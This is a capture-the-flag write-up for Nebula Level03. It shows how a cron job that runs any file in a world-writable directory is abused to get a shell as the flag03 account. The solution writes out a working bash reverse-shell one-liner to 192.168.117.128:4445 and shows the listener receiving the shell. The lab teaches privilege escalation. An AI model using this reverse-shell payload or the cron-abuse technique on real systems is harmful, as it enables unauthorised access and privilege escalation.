# Level03

> Check the home directory of **flag03** and take note of the files there.
>
> There is a crontab that is called every couple of minutes.
>
> To do this level, log in as the **level03** account with the password level03. Files for this level can be found in /home/flag03.

#### Solution

```bash
level03@nebula:/home/flag03$ ls -la
total 6
drwxr-x--- 3 flag03 level03  103 2011-11-20 20:39 .
drwxr-xr-x 1 root   root      80 2012-08-27 07:18 ..
-rw-r--r-- 1 flag03 flag03   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag03 flag03  3353 2011-05-18 02:54 .bashrc
-rw-r--r-- 1 flag03 flag03   675 2011-05-18 02:54 .profile
drwxrwxrwx 2 flag03 flag03     3 2012-08-18 05:24 writable.d
-rwxr-xr-x 1 flag03 flag03    98 2011-11-20 21:22 writable.sh
level03@nebula:/home/flag03$ cat writable.sh
#!/bin/sh

for i in /home/flag03/writable.d/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

So, here's a directory `writable.d`  owned by flag03(target) and we have read, write and execute permission on it.  A script `writable.sh` is also there which is firstly executing one by one files under that `writable.d` directory and then remove it.

What if we create a malicious bash script inside that folder, so that whenever that `writable.sh` triggered by flag03(cronjob), the script we made will executed and so, that we will gain shell as flag03.

```bash
level03@nebula:/home/flag03$ cd writable.d/
level03@nebula:/home/flag03/writable.d$ echo '/bin/bash -i >& /dev/tcp/192.168.117.128/4445 0>&1' > script.sh
level03@nebula:/home/flag03/writable.d$ chmod +x script.sh
level03@nebula:/home/flag03/writable.d$ ls -la
total 4
drwxrwxrwx 1 flag03  flag03  60 2025-09-25 02:24 .
drwxr-x--- 1 flag03  level03 60 2011-11-20 20:39 ..
-rwxrwxr-x 1 level03 level03 51 2025-09-25 02:24 script.sh
```

And we got reverse shell on the listener.

```bash
┌──(ghost㉿kali)-[~]
└─$ rlwrap -f . -r nc -nvlp 4445
listening on [any] 4445 ...
connect to [192.168.117.128] from (UNKNOWN) [192.168.117.140] 51475
bash: no job control in this shell
flag03@nebula:~$ id
id
uid=996(flag03) gid=996(flag03) groups=996(flag03)
flag03@nebula:~$ getflag
getflag
You have successfully executed getflag on a target account
```
